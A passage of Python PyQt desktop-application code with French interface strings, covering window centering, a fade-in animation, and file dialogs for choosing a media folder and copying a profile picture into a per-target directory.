            directory = QFileDialog.getExistingDirectory(self, "Sélectionner le dossier pour les médias de la sandbox")
            if directory:
                self.i_videos_dir.setText(directory)

        except Exception as e:
            log_error_to_file('Release.select_custom_videos_dir', e)
            log_error('Release.select_custom_videos_dir', e)
    def select_profile_pic(self):
        button_id = f"select_pic_{self.tid}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            file_path, _ = QFileDialog.getOpenFileName(self, "Sélectionner une photo de profil", "", "Images (*.png *.jpg *.jpeg *.gif *.webp *.bmp *.svg *.tiff *.tif *.ico *.avif *.heif *.heic *.jfif *.apng *.mng *.exr *.psd);;Tous les fichiers (*)")
            if file_path:
                import shutil, time
                from config import get_video_dir
                video_dir = get_video_dir(self.tid)
                os.makedirs(video_dir, exist_ok=True)
                filename = os.path.basename(file_path)
                safe_filename = f"profile_{int(time.time())}_{filename.replace(' ', '_')}"
                dest_path = os.path.join(video_dir, safe_filename)
                shutil.copy2(file_path, dest_path)
                self.i_p.setText(safe_filename)
        except Exception as e: 
            log_error_to_file("TargetConfigWindow.select_profile_pic", e)
            log_error("TargetConfigWindow.select_profile_pic", e)
        finally:
            button_manager.unlock_button(button_id)

    def center(self):
        qr = self.frameGeometry()
        cp = self.screen().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def showEvent(self, event):
        self.center()
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(400)
        self.animation.setStartValue(0.0)
        self.animation.setEndValue(1.0)
        self.animation.setEasingCurve(QEasingCurve.Type.InOutQuad)
        self.animation.start()
        super().showEvent(event)

    def closeEvent(self, event):
        if self.tid in self.main_win.victim_windows:
            del self.main_win.victim_windows[self.tid]
        event.accept()
